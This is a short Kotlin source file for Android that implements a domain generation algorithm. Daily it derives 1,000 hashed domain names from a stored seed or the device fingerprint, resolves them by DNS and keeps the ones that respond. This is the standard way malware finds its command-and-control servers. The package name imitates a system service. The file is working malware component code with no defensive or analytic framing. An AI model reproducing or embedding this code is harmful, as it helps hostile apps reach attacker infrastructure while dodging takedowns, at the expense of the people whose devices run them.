// [context: Kotlin, Android API 26+, SHA256 DGA domain resolution]
package com.system.service.network

import android.content.Context
import kotlinx.coroutines.*
import java.net.InetAddress
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*

class DGAResolver(private val context: Context) {

    fun resolveActive(): List<String> {
        val seed = getSeed()
        val date = SimpleDateFormat("yyyyMMdd", Locale.US).format(Date())
        val domains = generateDomains(seed, date)
        return domains.filter { canResolve(it) }.take(3)
    }

    private fun generateDomains(seed: ByteArray, date: String): List<String> {
        val tlds = listOf(".com", ".net", ".org", ".info", ".biz")
        val md = MessageDigest.getInstance("SHA-256")
        return (0 until 1000).map { i ->
            md.reset()
            val input = seed + date.toByteArray() + i.toString().toByteArray()
            val hash = md.digest(input)
            val domain = hash.take(12).joinToString("") { "%02x".format(it) }
            val tld = tlds[hash[12].toInt().and(0xFF) % tlds.size]
            domain + tld
        }
    }

    private fun canResolve(domain: String): Boolean {
        return try {
            InetAddress.getByName(domain)
            true
        } catch (_: Exception) { false }
    }

    private fun getSeed(): ByteArray {
        val prefs = context.getSharedPreferences("dga", Context.MODE_PRIVATE)
        val s = prefs.getString("seed", null)
        return if (s != null) android.util.Base64.decode(s, android.util.Base64.DEFAULT)
        else android.os.Build.FINGERPRINT.toByteArray()
    }
}
